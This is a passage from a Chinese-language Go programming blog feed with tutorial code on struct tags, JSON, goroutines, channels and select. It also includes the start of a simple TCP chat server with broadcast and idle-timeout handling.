class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="结构体标签"><a href="#结构体标签" class="headerlink" title="结构体标签"></a>结构体标签</h3><p> 结构体标签可以为结构体的字段添加元数据。标签通常用于<code>编码和解码（如 JSON、XML）</code>，验证，数据库映射等。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;encoding/json&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;reflect&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Person 结构体，包含 Name 和 Age 字段，并且每个字段都有一个 &quot;info&quot; 标签</span></span><br><span class="line"><span class="keyword">type</span> Person <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span> <span class="string">`info:&quot;name&quot;`</span></span><br><span class="line">Age  <span class="type">int</span>    <span class="string">`info:&quot;age&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// findTag 函数，使用反射来获取结构体字段的标签信息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findTag</span><span class="params">(t <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line"><span class="comment">// 获取指针指向的元素类型</span></span><br><span class="line">tmp := reflect.TypeOf(t).Elem()</span><br><span class="line"><span class="comment">// 遍历结构体的字段</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; tmp.NumField(); i++ &#123;</span><br><span class="line"><span class="comment">// 获取字段的标签信息</span></span><br><span class="line">taginfo := tmp.Field(i).Tag.Get(<span class="string">&quot;info&quot;</span>)</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, taginfo)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Student 结构体，包含 Name, Age 和 Sex 字段，并且每个字段都有一个 &quot;json&quot; 标签</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">Name <span class="type">string</span>   <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">Age  <span class="type">int</span>      <span class="string">`json:&quot;age&quot;`</span></span><br><span class="line">Sex  []<span class="type">string</span> <span class="string">`json:&quot;sex&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个 Person 类型的变量 p</span></span><br><span class="line"><span class="keyword">var</span> p Person</span><br><span class="line"><span class="comment">// 调用 findTag 函数，并传入 p 的指针</span></span><br><span class="line">findTag(&amp;p) <span class="comment">// 传入指针是因为反射需要访问结构体的类型信息，而 t 是 interface&#123;&#125; 类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个 Student 实例，并填充数据</span></span><br><span class="line">s := Student&#123;</span><br><span class="line">Name: <span class="string">&quot;USA&quot;</span>,</span><br><span class="line">Age:  <span class="number">18</span>,</span><br><span class="line">Sex:  []<span class="type">string</span>&#123;<span class="string">&quot;male&quot;</span>, <span class="string">&quot;female&quot;</span>, <span class="string">&quot;tank&quot;</span>&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 Student 实例转换为 JSON 字符串</span></span><br><span class="line">jsonData, err := json.Marshal(s)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;json err:&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="type">string</span>(jsonData))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个空的 Student 实例 s1</span></span><br><span class="line">s1 := Student&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 JSON 字符串转换回 Student 实例</span></span><br><span class="line">err1 := json.Unmarshal(jsonData, &amp;s1)</span><br><span class="line"><span class="keyword">if</span> err1 != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;json err:&quot;</span>, err1)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(s1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Goroutine"><a href="#Goroutine" class="headerlink" title="Goroutine"></a>Goroutine</h3><ul><li>协程是轻量级的线程，通常由用户程序通过协程库或语言层面的支持来实现。协程可以在单个线程内实现多任务的并发执行。</li><li>即在线程的层面上（<code>用户态</code>），再运行一个调度器进行协程调度</li><li>在 Go 中，当<code>主 goroutine（即 main 函数）</code>退出时，所有其他的 goroutine 也会立即退出。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;runtime&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// func newTask() &#123;</span></span><br><span class="line"><span class="comment">// i := 0</span></span><br><span class="line"><span class="comment">// for &#123;</span></span><br><span class="line"><span class="comment">// i++</span></span><br><span class="line"><span class="comment">// fmt.Printf(&quot;%d &quot;, i)</span></span><br><span class="line"><span class="comment">// time.Sleep(10 * time.Millisecond)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;main exit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//go newTask() // 启动一个函数的 goroutine</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123; <span class="comment">// 启动一个匿名函数的 goroutine</span></span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">defer</span> fmt.Println(<span class="string">&quot;func exit&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d &quot;</span>, i)</span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Millisecond)</span><br><span class="line"><span class="keyword">if</span> i == <span class="number">500</span> &#123;</span><br><span class="line">runtime.Goexit() <span class="comment">// 退出当前 goroutine</span></span><br><span class="line"><span class="comment">//return          // 另一种退出方式</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主程序等待 10 秒钟，以便观察 goroutine 的输出</span></span><br><span class="line">time.Sleep(<span class="number">10</span> * time.Second)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="channel"><a href="#channel" class="headerlink" title="channel"></a>channel</h3><ul><li>channel不需要像文件需要经常关闭，当我们没有数据或<code>显式结束range循环才去关闭channel</code></li><li>关闭channel后无法发送数据，但是可以接收数据</li><li>对于nil channel，收发都会被阻塞</li></ul><h4 id="channel的基本使用"><a href="#channel的基本使用" class="headerlink" title="channel的基本使用"></a>channel的基本使用</h4><p>我们可以将channel当作<code>返回值</code>使用，主函数执行到读取通道值时会<code>阻塞</code>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个整型的通道</span></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 启动一个匿名函数的 goroutine</span></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">fmt.Print(<span class="string">&quot;Randolfluo\n&quot;</span>)</span><br><span class="line"><span class="comment">// 向通道发送一个值 0，表示子 goroutine 完成，相当于返回值</span></span><br><span class="line">time.Sleep(<span class="number">2</span> * time.Second)</span><br><span class="line">c &lt;- <span class="number">0</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从通道接收一个值，阻塞直到接收到值</span></span><br><span class="line">num := &lt;-c</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查返回值</span></span><br><span class="line"><span class="keyword">if</span> num == <span class="number">0</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;func exit with 0&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;func exit with others&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="有容量的channel"><a href="#有容量的channel" class="headerlink" title="有容量的channel"></a>有容量的channel</h4><ul><li>channel提供缓冲区缓存数据</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">channel_test</span><span class="params">(c <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="built_in">close</span>(c) <span class="comment">// 在函数结束时关闭通道</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">c &lt;- i </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// 创建一个缓冲容量为 3 的整型通道</span></span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> channel_test(c)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;len cap  i&quot;</span>) </span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="comment">// 从通道接收数据，并打印通道的当前长度、容量和接收的值</span></span><br><span class="line">fmt.Println(<span class="built_in">len</span>(c), <span class="string">&quot;  &quot;</span>, <span class="built_in">cap</span>(c), <span class="string">&quot; &quot;</span>, &lt;-c)</span><br><span class="line">&#125; <span class="comment">//每次输出都不同，但是最大容量不会大于cap</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="range-amp-select"><a href="#range-amp-select" class="headerlink" title="range &amp; select"></a>range &amp; select</h4><ul><li>range方便我们<code>遍历</code></li><li>select提供<code>多路复用</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;runtime&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newTask</span><span class="params">(c, q <span class="keyword">chan</span> <span class="type">int</span>)</span></span> &#123;</span><br><span class="line">i := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">i++</span><br><span class="line">c &lt;- i</span><br><span class="line">time.Sleep(<span class="number">100</span> * time.Millisecond)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i == <span class="number">20</span> &#123;</span><br><span class="line"><span class="built_in">close</span>(c)         <span class="comment">// 关闭通道 c，停止 range 循环</span></span><br><span class="line">q &lt;- <span class="number">1</span>           <span class="comment">// 向通道 q 发送退出信号</span></span><br><span class="line"><span class="built_in">close</span>(q)         <span class="comment">// 关闭通道 q，表示 不再向q写入数据</span></span><br><span class="line">runtime.Goexit() <span class="comment">// 退出当前 goroutine</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">// 创建一个通道 c，用于接收整数</span></span><br><span class="line">q := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>) <span class="comment">// 创建一个通道 q，用于接收退出信号</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> newTask(c, q)</span><br><span class="line"></span><br><span class="line">label:</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> data := &lt;-c:</span><br><span class="line"><span class="comment">// 从通道 c 接收到整数</span></span><br><span class="line"><span class="comment">// case data, ok := &lt;-c:</span></span><br><span class="line"><span class="comment">// if !ok &#123;</span></span><br><span class="line"><span class="comment">// break label//可以通过此方式跳出for循环</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">fmt.Print(data, <span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> ret := &lt;-q:</span><br><span class="line"><span class="comment">// 从通道 q 接收到退出信号</span></span><br><span class="line">fmt.Println(<span class="string">&quot;\nrange exit with code&quot;</span>, ret)</span><br><span class="line"><span class="keyword">break</span> label <span class="comment">// 使用标签跳出 for 循环</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;\nmain exit&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4>]]></content>
      
      
      <categories>
          
          <category> golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go即时通信</title>
      <link href="/2024/08/08/golang/go%E5%8D%B3%E6%97%B6%E9%80%9A%E4%BF%A1/"/>
      <url>/2024/08/08/golang/go%E5%8D%B3%E6%97%B6%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<ul><li><strong>广播</strong>：函数将需要发送的数据发送到server管道，然后通过一个server协程通过管道传输给每个用户的私聊子协程发送消息。</li><li><strong>私聊：</strong>写入对应用户的管道中</li></ul><h3 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h3><p><code>main.go</code>一般是服务器配置启动</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">Server := NewServer(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>)</span><br><span class="line">Server.Start()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="server-go"><a href="#server-go" class="headerlink" title="server.go"></a>server.go</h3><p>主要处理监听端口、接收发送消息，并提供广播基础设施，为用户创建对应的对象</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Server <span class="keyword">struct</span> &#123;</span><br><span class="line">IP      <span class="type">string</span></span><br><span class="line">Port    <span class="type">int</span></span><br><span class="line">UserMap <span class="keyword">map</span>[<span class="type">string</span>]*User</span><br><span class="line"></span><br><span class="line">maplock sync.RWMutex</span><br><span class="line"><span class="comment">//消息广播的channel</span></span><br><span class="line">Message <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewServer</span><span class="params">(ip <span class="type">string</span>, port <span class="type">int</span>)</span></span> *Server &#123;</span><br><span class="line">server := &amp;Server&#123; <span class="comment">//指向server指针</span></span><br><span class="line">IP:      ip,</span><br><span class="line">Port:    port,</span><br><span class="line">UserMap: <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]*User),</span><br><span class="line">Message: <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> server</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将消息发送给所有用户的管道</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(server *Server)</span></span> ListenMessage() &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;广播消息协程启动&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">msg := &lt;-server.Message</span><br><span class="line">server.maplock.Lock()</span><br><span class="line"><span class="keyword">for</span> _, user := <span class="keyword">range</span> server.UserMap &#123;</span><br><span class="line">user.C &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line">server.maplock.Unlock()</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(server *Server)</span></span> BroadCast(user *User, msg <span class="type">string</span>) &#123;</span><br><span class="line">sendMsg := <span class="string">&quot;[&quot;</span> + user.Addr + <span class="string">&quot;]&quot;</span> + user.Name + <span class="string">&quot;:&quot;</span> + msg</span><br><span class="line"><span class="comment">//fmt.Printf(&quot;广播消息: %s\n&quot;, sendMsg)</span></span><br><span class="line">server.Message &lt;- sendMsg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(server *Server)</span></span> Handler(conn net.Conn) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;链接建立成功 ip:&quot;</span>, conn.RemoteAddr().String())</span><br><span class="line">user := NewUser(conn, server)</span><br><span class="line"><span class="comment">//fmt.Println(user)原来这里发生了空指针异常，打印user结构体发现是为给server字段赋值</span></span><br><span class="line">user.Online()</span><br><span class="line"></span><br><span class="line">islive := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">4096</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">n, err := conn.Read(buf)</span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span> &#123; <span class="comment">//连接已经被关闭</span></span><br><span class="line">user.Offline()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err != io.EOF &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;conn.Read err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">msg := <span class="type">string</span>(buf[:n<span class="number">-1</span>])</span><br><span class="line">fmt.Println(<span class="string">&quot;收到客户端&quot;</span>, user.Name, <span class="string">&quot;发来的消息:&quot;</span>, msg)</span><br><span class="line">user.DoMessage(msg)</span><br><span class="line">islive &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-islive:</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second * <span class="number">100</span>):</span><br><span class="line">user.SendMsg(<span class="string">&quot;服务器100秒没有收到你的消息，强制关闭连接&quot;</span>)</span><br><span class="line"><span class="built_in">close</span>(user.C)</span><br><span class="line">conn.Close()</span><br><span class="line"><span class="comment">//user.Offline()不用退出，协程在handler函数退出后依旧会执行，检测</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">//runtime.Goexit()</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(server *Server)</span></span> Start() &#123;</span><br><span class="line">listener, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="string">&quot;%s:%d&quot;</span>, server.IP, server.Port))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;net.Listen err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> listener.Close()</span><br><span class="line"><span class="keyword">go</span> server.ListenMessage() <span class="comment">//启动一个goroutine来发送广播消息到每个用户</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">conn, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;listener.Accept err:&quot;</span>, err)</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">//当前链接有问题，跳过直接接收下一链接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> server.Handler(conn)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="user-go"><a href="#user-go" 